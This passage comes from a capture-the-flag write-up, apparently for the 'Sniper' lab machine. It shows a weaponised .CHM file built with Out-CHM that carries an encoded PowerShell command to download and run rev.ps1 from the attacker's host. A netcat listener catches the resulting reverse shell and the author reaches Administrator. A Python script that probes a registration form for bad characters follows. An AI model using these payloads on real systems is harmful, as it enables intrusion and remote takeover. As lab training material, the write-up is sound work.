> Compression increased file by 281 bytes.
> ```
>

Then, use `tcpdump` to listen for *icmp* packets

```bash
tcpdump --interface tun1 -v -n icmp
```

And transfer the created file in the *Docs* directory of the *target*

```bash
IWR -UseBasicParsing -Uri http://10.10.16.30:8888/doc.chm -OutFile C:\Docs\doc.chm
```

And we receive an *ICMP* packet

> [!NOTE]- *TCPDump's Output*
>
> ```bash
> tcpdump: listening on tun1, link-type RAW (Raw IP), snapshot length 262144 bytes
> 
> 19:15:36.020837 IP (tos 0x0, ttl 127, id 30165, offset 0, flags [none], proto ICMP (1), length 60)
>     10.129.229.6 > 10.10.16.30: ICMP echo request, id 1, seq 1, length 40
> 19:15:36.020955 IP (tos 0x0, ttl 64, id 62925, offset 0, flags [none], proto ICMP (1), length 60)
>     10.10.16.30 > 10.129.229.6: ICMP echo reply, id 1, seq 1, length 40
> ^C
> 2 packets captured
> 2 packets received by filter
> 0 packets dropped by kernel
> ```
>

Therefore, we will create a *.CHM* file which runs the following payload to get a *reverse shell* from the *target*

```bash
echo -n "IEX (IWR -UseBasicParsing -Uri http://10.10.16.30:8888/rev.ps1)" | iconv --to-code UTF-16LE | base64 -w 0 ; echo
```

> [!NOTE]- *Command Output*
>
> ```bash
> SQBFAFgAIAAoAEkAVwBSACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMAMAA6ADgAOAA4ADgALwByAGUAdgAuAHAAcwAxACkA
> ```
>

- ***.CHM File Creation***

```bash
Out-CHM -Payload "powershell.exe -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0AVQByAGkAIABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADMAMAA6ADgAOAA4ADgALwByAGUAdgAuAHAAcwAxACkA" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

> [!NOTE]- *Command Output*
>
> ```bash
> Microsoft HTML Help Compiler 4.74.8702
> 
> Compiling c:\Users\Alejandro\doc.chm
> 
> Compile time: 0 minutes, 0 seconds
> 2       Topics
> 4       Local links
> 4       Internet links
> 0       Graphics
> 
> 
> Created c:\Users\Alejandro\doc.chm, 13,536 bytes
> Compression increased file by 213 bytes.
> ```
>

- ***Set up a Listener Socket***

```bash
rlwrap -CaR nc -nlvp 4444
```

- ***.CHM File Transfer to the Target*** 🎯

```bash
IWR -UseBasicParsing -Uri http://10.10.16.30:8888/doc.chm -OutFile C:\Docs\doc.chm
```

> [!NOTE]- *Simple HTTP Server Output*
>
> ```bash
> Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
> 
> 10.129.229.6 - - [22/Mar/2025 19:56:49] "GET /doc.chm HTTP/1.1" 200 -
> 10.129.229.6 - - [22/Mar/2025 19:57:31] "GET /doc.chm HTTP/1.1" 200 -
> 10.129.229.6 - - [22/Mar/2025 19:57:45] "GET /rev.ps1 HTTP/1.1" 200 -
> ```
>

> [!NOTE]- *RLWrap Output*
>
> ```bash
> listening on [any] 4444 ...
> connect to [10.10.16.30] from (UNKNOWN) [10.129.229.6] 49715
> ```
>

And we are in as *Administrator*

```bash
whoami
```

> [!NOTE]- *Command Output*
>
> ```bash
> sniper\administrator
> ```
>

At this point, just get the *root.txt* flag and move on to the next! 😊

```bash
Get-Content C:\Users\Administrator\Desktop\root.txt
```

---

#### Custom Exploits

##### *Bad Chars Checker in User Registration URL*

> [!BUG]-
> ```python
>
> #!/usr/bin/env python3
> 
> import requests
> import sys
> import string
> import random
> import argparse
> import time
> import signal
> import os
> 
> from colorama import Fore, Style
> from pwn import *
> 
> def sigintHandler(sig: signal.Signals, frame: types.FrameType | None) -> None:
> 
>     print('\n')
>     p = log.progress(Fore.CYAN + "Signal ⚡" + Style.RESET_ALL)
>     p.status(Fore.MAGENTA + f"SIGINT signal sent to {sys.argv[0]}. {Fore.RED}Exiting ⌛..." + Style.RESET_ALL)
> 
>     time.sleep(1)
> 
>     signal.signal(signal.SIGINT, signal.SIG_DFL)
> 
>     os.killpg(os.getpid(), signal.SIGINT)
> 
> def register(url: str) -> None:
> 
>     print()
>     p = log.progress(Fore.CYAN + "Bad Chars 🐉" + Style.RESET_ALL)
>     p.status(Fore.MAGENTA + "Checking for bad chars 💀in the registration url ⌛..." + Style.RESET_ALL)
>     time.sleep(1)
> 
>     chars = string.ascii_letters + string.digits
>     juicy_chars = string.punctuation
>     bad_chars = ''
> 
>     for char in juicy_chars:
> 
>         user = f'{char}4l3xbb{char}'
>         passwd = ''.join(random.choices(chars, k=15))
> 
>         p.status(Fore.MAGENTA + bad_chars + char + Style.RESET_ALL)
> 
>         try:
>             post_data = {
>                 'email' : 'test@domain.tld',
>                 'username' : user,
>                 'password' : passwd,
>                 'submit' : ''
>             }
> 
>             r = requests.post(url, data=post_data)
> 
>             if login(opts.l_url, user, passwd):
> 
>                 bad_chars += char
> 
>         except requests.RequestException as e:
> 
>             print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
>             sys.exit(1)
> 
>     p.success(Fore.GREEN + bad_chars + Style.RESET_ALL)
> 
> def login(url: str, user: str, passwd: str) -> bool:
> 
>     post_data = {
>         'username' : user,
>         'password' : passwd,
>         'submit' : ''
>     }
> 
>     try:
>         r = requests.post(url, data=post_data)
> 
>         return True if "Username/password is incorrect" in r.text else False
> 
>     except requests.RequestException as e:
> 
>         print(Fore.RED + f"" + Style.RESET_ALL)
>         sys.exit(1)
> 
> def main() -> None:
> 
>     signal.signal(signal.SIGINT, sigintHandler)
> 
>     parser = argparse.ArgumentParser(
>         description=Fore.MAGENTA + f"Script to check for bad_chars in sniper's registration panel" + Style.RESET_ALL
>     )
> 
>     parser.add_argument('r_url', metavar='registration_url', help='Registration Panel URL')
>     parser.add_argument('l_url', metavar='login_url', help='Login Panel URL')
> 
>     opts = parser.parse_args()
> 
>     if not opts.r_url or not opts.l_url:
> 
>         parser.print_help()
>         sys.exit(1)
> 
>     register(opts.r_url)
> 
> if __name__ == '__main__':
> 
>     main()
> ```
>
